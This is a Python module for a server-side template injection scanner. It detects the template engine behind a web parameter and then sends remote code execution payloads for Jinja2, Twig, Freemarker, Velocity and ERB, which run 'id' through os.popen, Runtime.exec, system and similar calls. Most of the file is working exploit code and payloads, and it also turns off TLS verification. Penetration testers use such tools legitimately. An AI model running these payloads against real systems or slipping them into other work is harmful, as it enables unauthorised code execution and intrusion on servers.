#!/usr/bin/env python3
"""
ssti_scanner.py — Server-Side Template Injection Scanner

Tests for SSTI in Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty,
Mako, Tornado, ERB, Slim, and generic polyglot payloads.
Auto-detects template engine from response + does blind detection.

Usage:
    from ssti_scanner import SSTIScanner
    scanner = SSTIScanner()
    result = scanner.test_url("https://target.com/page?name=test")
"""
import json
import math
import os
import re
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import requests
except ImportError:
    requests = None

# ── SSTI payloads per engine ───────────────────────────────────────────────────

SSTI_PAYLOADS = {
    "polyglot": [
        {"payload": "{{7*7}}", "expect": "49", "engine": "jinja2/twig"},
        {"payload": "${7*7}", "expect": "49", "engine": "freemarker/velocity"},
        {"payload": "#{7*7}", "expect": "49", "engine": "ruby_erb/java_el"},
        {"payload": "<%= 7*7 %>", "expect": "49", "engine": "erb/slim"},
        {"payload": "{{7*'7'}}", "expect": "7777777", "engine": "jinja2"},
        {"payload": "${7*7}", "expect": "49", "engine": "mako"},
    ],
    "jinja2": [
        {"payload": "{{config}}", "check": "SECRET_KEY", "severity": "HIGH"},
        {"payload": "{{self.__init__.__globals__}}", "check": "os", "severity": "CRITICAL"},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "check": "Popen", "severity": "CRITICAL"},
        {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "check": "uid=", "severity": "CRITICAL"},
    ],
    "twig": [
        {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "check": "uid=", "severity": "CRITICAL"},
        {"payload": "{{['id']|filter('system')}}", "check": "uid=", "severity": "CRITICAL"},
    ],
    "freemarker": [
        {"payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "check": "uid=", "severity": "CRITICAL"},
        {"payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "check": "uid=", "severity": "CRITICAL"},
    ],
    "velocity": [
        {"payload": "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')", "check": "Process", "severity": "CRITICAL"},
    ],
    "erb": [
        {"payload": "<%= system('id') %>", "check": "uid=", "severity": "CRITICAL"},
        {"payload": "<%= `id` %>", "check": "uid=", "severity": "CRITICAL"},
    ],
}


class SSTIScanner:
    """Server-Side Template Injection scanner."""

    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            import urllib3
            urllib3.disable_warnings()

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a parameter value with payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def detect_engine(self, url: str, param: str,
                      headers: dict = None) -> dict:
        """Detect template engine via polyglot payloads."""
        headers = headers or {}
        result = {"detected": False, "engine": "", "evidence": ""}

        for entry in SSTI_PAYLOADS["polyglot"]:
            test_url = self._inject_param(url, param, entry["payload"])
            try:
                resp = self.session.get(test_url, headers=headers, timeout=8)
                if entry["expect"] in resp.text:
                    result["detected"] = True
                    result["engine"] = entry["engine"]
                    result["evidence"] = f"Payload {entry['payload']} → {entry['expect']}"
                    return result
            except Exception:
                continue
            time.sleep(0.3)

        return result

    def exploit_engine(self, url: str, param: str, engine: str,
                       headers: dict = None) -> dict:
        """Try RCE payloads for detected engine."""
        headers = headers or {}
        result = {"rce": False, "evidence": ""}

        # Get engine-specific payloads
        engine_key = engine.split("/")[0].lower()  # "jinja2/twig" → "jinja2"
        payloads = SSTI_PAYLOADS.get(engine_key, [])

        for entry in payloads:
            test_url = self._inject_param(url, param, entry["payload"])
            try:
                resp = self.session.get(test_url, headers=headers, timeout=8)
                check = entry.get("check", "")
                if check and check.lower() in resp.text.lower():
                    result["rce"] = True
                    result["severity"] = entry.get("severity", "CRITICAL")
                    result["payload"] = entry["payload"]
                    result["evidence"] = resp.text[:300]
                    return result
            except Exception:
                continue
            time.sleep(0.5)

        return result

    def test_url(self, url: str, headers: dict = None) -> dict:
        """Test a URL for SSTI on all parameters."""
        headers = headers or {}
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        results = {
            "url": url,
            "params_tested": len(params),
            "vulnerable": False,
            "findings": [],
        }

        for param in params:
            detection = self.detect_engine(url, param, headers)
            if detection["detected"]:
                finding = {
                    "param": param,
                    "engine": detection["engine"],
                    "evidence": detection["evidence"],
                    "severity": "HIGH",
                }

                # Try RCE
                exploit = self.exploit_engine(
                    url, param, detection["engine"], headers)
                if exploit.get("rce"):
                    finding["rce"] = True
                    finding["severity"] = "CRITICAL"
                    finding["rce_payload"] = exploit.get("payload", "")
                    finding["rce_evidence"] = exploit.get("evidence", "")

                results["findings"].append(finding)
                results["vulnerable"] = True
                self.findings.append({
                    "type": "SSTI", "url": url, **finding})

        return results

    def test_post(self, url: str, params: dict,
                  headers: dict = None) -> dict:
        """Test POST parameters for SSTI."""
        headers = headers or {}
        results = {"url": url, "vulnerable": False, "findings": []}

        for param, value in params.items():
            for entry in SSTI_PAYLOADS["polyglot"]:
                test_params = {**params, param: entry["payload"]}
                try:
                    resp = self.session.post(url, data=test_params,
                                           headers=headers, timeout=8)
                    if entry["expect"] in resp.text:
                        finding = {
                            "param": param, "engine": entry["engine"],
                            "severity": "HIGH",
                            "evidence": f"{entry['payload']} → {entry['expect']}",
                        }
                        results["findings"].append(finding)
                        results["vulnerable"] = True
                        self.findings.append({
                            "type": "SSTI", "url": url, **finding})
                        break
                except Exception:
                    continue
                time.sleep(0.3)

        return results

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/ssti")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"ssti_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))
